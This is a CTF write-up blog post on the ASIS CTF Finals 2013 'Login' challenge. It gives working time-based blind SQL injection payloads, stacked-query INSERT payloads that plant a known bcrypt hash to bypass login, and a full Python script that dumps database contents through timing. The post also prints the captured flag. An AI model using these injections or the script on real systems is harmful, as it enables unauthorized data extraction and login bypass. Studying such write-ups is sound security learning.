---
title: ASIS CTF Finals 2013 Login
author: DeAdCaT___
layout: post
permalink: /asis-ctf-finals-2013-login/
categories:
  - CTF
  - writeup
---
<http://blog.deadcat.me/writeup/2013/09/01/asis-ctf-finals-2013-login/>

Description

    Login
    
    Points  350     Level   1   Solves  5
    
    Description
    78.38.193.187
    
    Hint:
    $2y$10$HXDsGCYFW5ajuzYO5qcyfOygl5r27BQB5DkL5ZfgoTfPSRMhlUAnG
    

All you can see is a login form, it always has some SQL injection problem.

After a lot of testing, finally we find a time-based blind injection in the username.

Using

    1' AND BENCHMARK(5000000,MD5(0x123)) AND ''='
    

then we start to using sqlmap to deal with it, but it is too slow and show some mistakes.

One of my friend write a python script to solve it, then we find some useful infomation. There are three database:

    information_schema
    sqli_db
    test
    

Obviously, sqli_db is suspicious, let&#8217;s see what it has.

    users
    

It only has a table named users.

    user_id
    user_name
    user_email
    user_password_hash
    

At the beginning, we trying to fetch some data from it, but it is empty, some time later, we fetch a string from user&#95;password&#95;hash.

    $2y$10$gyI0vxnE3ZncmdLNGVmwTew/aPwBZPY4cEMCRENAjN4?0l8iu9O5R6iW
    

Just google &#8220;$2y$10&#8243;, we find it is the head of PHP blowfish hash, but it seems that there is no way to get the original value from it.

At that time, the admin give a hint on this problem:

    Hint:
    $2y$10$HXDsGCYFW5ajuzYO5qcyfOygl5r27BQB5DkL5ZfgoTfPSRMhlUAnG
    

At the same time, we find that the table users suddenly become empty. It inspire us to try INSERT.

    ';insert into users values (333,'hqd','1','1@1.com');select '
    

And it works!

Then it is so easy, just INSERT the correct hash value of a password u know it before, there is a php script can to do this.

    ';insert into users values (333,'hqd','$2y$10$YTNlM2RiNmFiODgzZGM2YuYqP7NHnuZ31TyucetPJkODqia/XH5KC','1@1.com');select '
    
    #this is the blowfish hash value of 'admin'
    

Then just login use username:hqd and password:admin, then here is the flag.

    ASIS_9689926853009CAAD5BF824863077DC9
    

And taste the flavor of the first blood.

f.py

    from httplib import HTTPConnection
    
    HTTPConnection._http_vsn_str = 'HTTP/1.0'
    
    def post_payload( payload ):
        conn = HTTPConnection( '78.38.193.187' )
        conn.putrequest( 'POST', '/', skip_accept_encoding=True, skip_host=True )
        conn.putheader( 'Content-Type', 'application/x-www-form-urlencoded' )
        conn.putheader( 'Content-Length', str(len(payload)) )
        conn.endheaders( message_body=payload )
        resp = conn.getresponse()
        resp.read()
    
    from urllib import urlencode
    from time import time
    
    def get_bool( expression ):
        start = time()
        post_payload( urlencode( dict(
            login = '',
            user_password = ' ',
            user_name = "'OR if(%s,benchmark(1500000,md5(0)),0) AND''='" % expression,
        ) ) )
        end = time()
        print 'Time:', end-start
        return end-start&gt;0.95
    
    def get_bit( expression ):
        return '1' if get_bool( expression ) else '0'
    
    from itertools import count
    
    def get_string( expression ):
        result = ''
        for i in count( start=1 ):
            char = ''
            for j in range(8)[::-1]:
                print 'Byte %d, Bit %d,' % (i,j),
                bit = get_bit( 'ascii(substr(%s,%d,1))&gt;&gt;%d&amp;1' % ( expression, i, j ) )
                print bit
                char += bit
            char = int( char, 2 )
            if char == 0: break
            result += chr(char)
        return result
    
    # def get_query( expression ):
    
    
    # print get_string( 'database()' )
    print get_string( '(SELECT IFNULL(CAST(table_name AS CHAR) ,0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c695f6462 LIMIT 0,1)' )
    # print get_string( '(SELECT IFNULL(CAST(table_name AS CHAR) ,0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=\'information_shema\' LIMIT 0,1)' )
    # print get_string( '(SELECT IFNULL(CAST(COLUMN_NAME AS CHAR) ,0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=\'users\' LIMIT 5,1)' )
    # print get_string( '(SELECT CAST(COUNT(*) AS CHAR) FROM users)' )
    # print get_string( '@@datadir' )
    # print get_string( 'user()' )
    # print get_string( 'version()' )
    

a.php

Founded from [pastebin][1]

 [1]: http://pastebin.com/y9GKtx0b